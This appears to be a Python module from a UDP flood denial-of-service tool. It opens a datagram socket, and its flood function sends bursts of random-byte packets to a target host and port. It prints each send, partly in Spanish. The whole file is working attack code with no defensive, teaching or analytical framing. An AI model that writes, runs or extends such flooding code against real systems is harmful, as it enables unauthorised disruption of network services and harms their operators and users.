# Import modules
import random
import socket

# Create socket
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)


def flood(target):
    for _ in range(16):
        try:
            payload = random._urandom(random.randint(1, 60))
            sock.sendto(payload, (target[0], target[1]))
        except Exception as e:
            print(f"Error while sending UDP packet \n")
        else:
            print(f"UDP random packet sent! Payload size: {len(payload)}, enviado a {target[0]}:{target[1]} \n")
